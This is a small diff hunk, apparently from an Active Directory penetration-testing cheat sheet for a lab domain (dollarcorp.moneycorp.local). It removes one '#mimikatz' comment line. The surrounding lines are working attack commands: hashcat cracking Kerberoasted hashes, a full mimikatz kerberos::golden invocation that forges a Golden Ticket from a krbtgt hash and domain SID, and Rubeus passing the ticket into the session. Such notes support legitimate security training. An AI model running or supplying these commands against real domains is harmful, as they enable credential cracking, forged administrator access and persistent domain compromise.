@@ -181,7 +181,6 @@ Kerberoasting
   hashcat -m 13100 hash.txt rockyou.txt
   
 Golden Ticket
-  #mimikatz
   kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
 
   .\Rubeus.exe ptt /ticket:ticket.kirbi
